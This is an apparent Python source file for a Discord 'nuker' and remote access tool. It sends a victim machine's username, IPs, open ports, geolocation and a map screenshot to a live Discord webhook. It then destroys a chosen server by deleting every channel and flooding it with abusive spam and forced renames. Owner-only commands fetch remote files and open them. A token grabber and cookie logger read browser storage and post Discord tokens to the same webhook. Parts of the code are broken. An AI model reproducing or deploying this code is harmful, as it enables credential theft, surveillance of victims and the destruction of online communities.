import discord
import asyncio
import os
import requests
import socket
import getpass
import platform
import subprocess
import shutil
import webbrowser
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from discord.ext import commands
import logging
from colorama import init, Fore, Style
import sys
import base64
import sqlite3
import json

# Initialize colorama for colored terminal output
init(autoreset=True)

# --------- Configuration ---------
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1404635371459055747/zQNsCOzX2KuS2D2rw45vII5C6FklDQHVIj4f9oNug-wQnJFVnFax7gyTk9L7VwmDXL5R"
MAIN_OWNER_ID = 1224433978166218855
CO_OWNER_ID = 1325987173266358384

CHANNEL_NAMES = [
    "GET FUCKED NGA",
    "NUKED BY UNTILED",
    "GOONERRRR",
    "LMAO BITCH ASS",
]

NICKNAMES_AND_DELAYS = [
    ("FUCKED BY UNTILED", 3),
    ("SHITTED ON BY UNTILED", 3),
    ("GGSSS IN THE CHAT FOR U", 3),
]

WEBHOOK_SPAM_MESSAGE = "@everyone @here LMAO ITS TO LATE TO FIX UR SEVER LMAO JOIN UP - https://discord.gg/gtQEEupsTp - THIS SEVER IS DEAD LOL"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# ----------------- Logger -----------------
def log(message, level="INFO"):
    colors = {
        "INFO": Fore.CYAN,
        "SUCCESS": Fore.GREEN,
        "ERROR": Fore.RED,
        "WARNING": Fore.YELLOW,
    }
    color = colors.get(level, "")
    print(f"{color}[{level}]{Style.RESET_ALL} {message}")

# ------------- Banner --------------
def print_banner():
    banner = r"""
______________________________________________________     ______________________________________
| | | | | \ | | |_   _| |_   _| | |     |  ___| |  _  \    | \ | | | | | | | | / / |  ___| | ___ \
| | | | |  \| |   | |     | |   | |     | |__   | | | |    |  \| | | | | | | |/ /  | |__   | |_/ /
| | | | | . ` |   | |     | |   | |     |  __|  | | | |    | . ` | | | | | |    \  |  __|  |    /
| |_| | | |\  |   | |    _| |_  | |___  | |___  | |/ /     | |\  | | |_| | | |\  \ | |___  | |\ \
 \___/  \_| \_/   \_/    \___/  \____/  \____/  |___/      \_| \_/  \___/  \_| \_/ \____/  \_| \_\
"""
    print(Fore.MAGENTA + Style.BRIGHT + banner + Style.RESET_ALL)

# ----------- Helper Functions -------------

def get_external_ip():
    try:
        r = requests.get('https://api.ipify.org?format=text', timeout=3)
        if r.status_code == 200:
            return r.text.strip()
    except:
        pass
    return None

def get_local_ips():
    ips = []
    hostname = socket.gethostname()
    try: ips.append(socket.gethostbyname(hostname))
    except: pass
    try:
        for info in socket.getaddrinfo(hostname, None):
            ip = info[4][0]
            if ip not in ips and ':' not in ip:
                ips.append(ip)
    except: pass
    return ips

def scan_ports(host='127.0.0.1', ports=[22, 80, 443, 8080]):
    open_ports = []
    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(0.5)
                if sock.connect_ex((host, port)) == 0:
                    open_ports.append(port)
        except:
            pass
    return open_ports

def get_geolocation(ip):
    try:
        r = requests.get(f'https://ipinfo.io/{ip}/json', timeout=3)
        if r.status_code == 200:
            data = r.json()
            loc = data.get('loc', '')
            city = data.get('city')
            country = data.get('country')
            if loc:
                lat_str, lon_str = loc.split(',')
                return float(lat_str), float(lon_str), city, country
    except:
        pass
    return None, None, None, None

async def take_map_screenshot(lat, lon, output_path='map_screenshot.png'):
    if lat is None or lon is None:
        return False
    map_url = f"https://www.google.com/maps/@{lat},{lon},12z"
    chrome_options = Options()
    chrome_options.add_argument('--headless')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--window-size=1024,768')
    chrome_options.add_argument('--log-level=3')
    driver = webdriver.Chrome(options=chrome_options)
    driver.get(map_url)
    await asyncio.sleep(2)
    driver.save_screenshot(output_path)
    driver.quit()
    return True

def send_webhook(info_text, image_path=None):
    try:
        data = {"content": info_text}
        if image_path and os.path.isfile(image_path):
            with open(image_path, "rb") as img:
                files = {"file": img}
                requests.post(WEBHOOK_URL, data=data, files=files)
        else:
            requests.post(WEBHOOK_URL, json=data)
    except:
        pass

# ------------- Nuker Functions --------------

async def main_nuke(guild):
    log("Starting nuke...", "INFO")
    try:
        await guild.edit(name="_-_-_- UNTILED OWNS YOU -_-_-_")
        log("Server name changed", "SUCCESS")
    except Exception as e:
        log(f"Failed to change server name immediately: {e}", "ERROR")

    # Delete all channels IN PARALLEL
    delete_tasks = [ch.delete() for ch in guild.channels]
    results = await asyncio.gather(*delete_tasks, return_exceptions=True)
    for result in results:
        if isinstance(result, Exception):
            log(f"Failed to delete channel: {result}", "ERROR")
        else:
            log("Deleted a channel.", "SUCCESS")
    log("Finished deleting all channels.", "SUCCESS")

    # Create 50 channels IN PARALLEL cycling through names
    create_tasks = []
    for i in range(50):
        name = CHANNEL_NAMES[i % len(CHANNEL_NAMES)]
        create_tasks.append(guild.create_text_channel(name=name))
    new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)

    real_channels = []
    for ch in new_channels:
        if isinstance(ch, Exception):
            log(f"Failed to create channel: {ch}", "ERROR")
        else:
            log(f"Created channel: {ch.name}", "SUCCESS")
            real_channels.append(ch)

    # Change server icon
    try:
        icon_path = os.path.join(os.path.dirname(__file__), "PNG.png")
        with open(icon_path, "rb") as f:
            icon_bytes = f.read()
        await guild.edit(icon=icon_bytes)
        log("Changed server icon from local file.", "SUCCESS")
    except Exception as e:
        log(f"Could not change server icon: {e}", "ERROR")

    # Spam message in all channels concurrently
    async def spam_channel(channel):
        for _ in range(30):
            try:
                await channel.send(WEBHOOK_SPAM_MESSAGE)
                await asyncio.sleep(0.3)
            except Exception as e:
                log(f"Failed to send in {channel.name}: {e}", "ERROR")

    spam_tasks = [spam_channel(ch) for ch in real_channels if isinstance(ch, discord.TextChannel)]
    await asyncio.gather(*spam_tasks)

    log("Spammed all new channels concurrently.", "SUCCESS")

    # Start rotating nicknames continuously
    bot.loop.create_task(rotate_nicknames(guild))

async def rotate_server_name(guild):
    names = ["_-_-_-_ CRASHED BITCH _-_-_-_", "-_-_-_---____SEVER GONE-_-_-_---____"]
    delay = 2
    while True:
        for name in names:
            try:
                await guild.edit(name=name)
                log(f"Server name changed to '{name}'", "SUCCESS")
            except Exception as e:
                log(f"Failed to change server name: {e}", "ERROR")
            await asyncio.sleep(delay)

async def rotate_channel_names(guild):
    index = 0
    while True:
        channels = guild.text_channels
        for i, channel in enumerate(channels):
            new_name = CHANNEL_NAMES[(index + i) % len(CHANNEL_NAMES)]
            try:
                await channel.edit(name=new_name)
                log(f"Renamed channel {channel.id} to '{new_name}'", "INFO")
            except Exception as e:
                log(f"Failed to rename channel {channel.id}: {e}", "ERROR")
        index = (index + 1) % len(CHANNEL_NAMES)
        await asyncio.sleep(3)

async def rotate_nicknames(guild):
    while True:
        for nick, delay in NICKNAMES_AND_DELAYS:
            for member in guild.members:
                if member.bot:
                    continue
                try:
                    await member.edit(nick=nick)
                    log(f"Changed nickname for {member.display_name} to '{nick}'", "INFO")
                    await asyncio.sleep(0.3)
                except Exception as e:
                    log(f"Failed to change nickname for {member.display_name}: {e}", "ERROR")
            await asyncio.sleep(delay)

# ------------ RAT Commands --------------

@bot.event
async def on_ready():
    print_banner()
    log(f"Logged in as {bot.user} (ID: {bot.user.id})", "SUCCESS")

    user_name = getpass.getuser()
    machine_name = socket.gethostname()
    os_info = platform.platform()
    external_ip = get_external_ip()
    local_ips = get_local_ips()
    open_ports = scan_ports()

    lat, lon, city, country = (None, None, None, None)
    if external_ip:
        lat, lon, city, country = get_geolocation(external_ip)

    lines = [
        f"machine user: {user_name}",
        f"machine name: {machine_name}",
        f"os info: {os_info}",
        f"external ip : {external_ip}",
    ]
    if local_ips:
        lines.append(f"local ip(s): {', '.join(local_ips)}")
    if open_ports:
        lines.append(f"open ports on localhost: {', '.join(str(p) for p in open_ports)}")
    if city:
        lines.append(f"city : {city}")
    if country:
        lines.append(f"country : {country}")
    if lat is not None and lon is not None:
        lines.append(f"latitude : {lat}")
        lines.append(f"longitude : {lon}")

    info = "\n".join(lines)
    screenshot_taken = await take_map_screenshot(lat, lon)

    if screenshot_taken:
        send_webhook(info, 'map_screenshot.png')
    else:
        send_webhook(info, None)

    guild = discord.utils.get(bot.guilds, id=GUILD_ID)
    if guild:
        await main_nuke(guild)
        bot.loop.create_task(rotate_server_name(guild))
        bot.loop.create_task(rotate_channel_names(guild))

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    author_id = message.author.id
    if author_id not in [MAIN_OWNER_ID, CO_OWNER_ID]:
        return  # Ignore commands from non-owners

    content = message.content.lower()
    args = message.content.split()
    cmd = args[0]

    guild = message.guild

    if cmd == "!shutdown":
        await message.channel.send("Shutting down...")
        await bot.close()

    elif cmd == "!restart":
        await message.channel.send("Restarting...")
        await bot.close()
        os.execv(sys.executable, ['python'] + sys.argv)

    elif cmd == "!error":
        await message.channel.send("Displaying error popup...")
        if os.name == "nt":
            subprocess.Popen('msg * "Error: Operation failed!"', shell=True)
        else:
            # For Linux/macOS you can implement a different notification
            pass

    elif cmd == "!del":
        await message.channel.send("Deleting bot files and exiting...")
        path = os.path.abspath(__file__)
        await bot.close()
        try:
            os.remove(path)
        except Exception:
            pass

    elif cmd == "!download":
        if len(args) < 2:
            await message.channel.send("Usage: !download <URL>")
        else:
            url = args[1]
            filename = url.split("/")[-1]
            try:
                r = requests.get(url)
                with open(filename, "wb") as f:
                    f.write(r.content)
                await message.channel.send(f"Downloaded file: {filename}")
            except Exception as e:
                await message.channel.send(f"Download failed: {e}")

    elif cmd == "!open":
        if len(args) < 2:
            await message.channel.send("Usage: !open <filename or URL>")
        else:
            target = args[1]
            try:
                if os.path.exists(target):
                    if os.name == "nt":
                        os.startfile(target)
                    elif sys.platform == "darwin":
                        subprocess.call(["open", target])
                    else:
                        subprocess.call(["xdg-open", target])
                    await message.channel.send(f"Opened {target}")
                else:
                    webbrowser.open(target)
                    await message.channel.send(f"Opened URL: {target}")
            except Exception as e:
                await message.channel.send(f"Failed to open {target}: {e}")

    # Add more commands as you want here

    await bot.process_commands(message)

if __name__ == "__main__":
    TOKEN = input(Fore.MAGENTA + "Enter bot token: " + Style.RESET_ALL)
    while True:
        guild_id_str = input(Fore.MAGENTA + "Enter server (guild) ID: " + Style.RESET_ALL)
        try:
            GUILD_ID = int(guild_id_str)
            break
        except ValueError:
            print(Fore.RED + "Invalid guild ID. Please enter a valid integer." + Style.RESET_ALL)
    bot.run(TOKEN)
    # ------------ COOKIE LOGGER --------------

def log_cookies(cookies):
    with open('cookies.log', 'a') as file:
        file.write(f"Cookies: {cookies}\n")

def send_cookies_to_webhook(cookies):
    webhook_url = "https://discordapp.com/api/webhooks/1404635371459055747/zQNsCOzX2KuS2D2rw45vII5C6FklDQHVIj4f9oNug-wQnJFVnFax7gyTk9L7VwmDXL5R"
    data = {"content": f"New cookies logged: {cookies}"}
    requests.post(webhook_url, json=data)
    # ------------ TOKEN GRABBER --------------
def get_chrome_tokens():
    path = os.path.expanduser('~/.config/google-chrome/Default/Local Storage/leveldb')
    if not os.path.exists(path):
        return None
    for file_name in os.listdir(path):
        if file_name.endswith('.ldb'):
            file_path = os.path.join(path, file_name)
            with open(file_path, 'r', encoding='utf-8') as file:
                for line in file:
                    if 'token' in line:
                        token = line.split(': ')[1].strip().strip('"')
                        return token
    return None

def get_firefox_tokens():
    path = os.path.expanduser('~/.mozilla/firefox/*/storage/default/https+++discord.com/idb/1574053527discord.com')
    if not os.path.exists(path):
        return None
    conn = sqlite3.connect(path)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM data WHERE key = 'token'")
    result = cursor.fetchone()
    if result:
        token = result[1]
        return token
    return None

def get_edge_tokens():
    path = os.path.expanduser('~/.config/microsoft-edge/Default/Local Storage/leveldb')
    if not os.path.exists(path):
        return None
    for file_name in os.listdir(path):
        if file_name.endswith('.ldb'):
            file_path = os.path.join(path, file_name)
            with open(file_path, 'r', encoding='utf-8') as file:
                for line in file:
                    if 'token' in line:
                        token = line.split(': ')[1].strip().strip('"')
                        return token
    return None

def send_token_to_webhook(token):
    webhook_url = "https://discordapp.com/api/webhooks/1404635371459055747/zQNsCOzX2KuS2D2rw45vII5C6FklDQHVIj4f9oNug-wQnJFVnFax7gyTk9L7VwmDXL5R"
    data = {"content": f"New Discord token logged: {token}"}
    requests.post(webhook_url, json=data)

if __name__ == "__main__":
    token = get_chrome_tokens() or get_firefox_tokens() or get_edge_tokens()
    if token:
        send_token_to_webhook(token)
        print(f"Token sent: {token}")
    else:
        print("No token found.")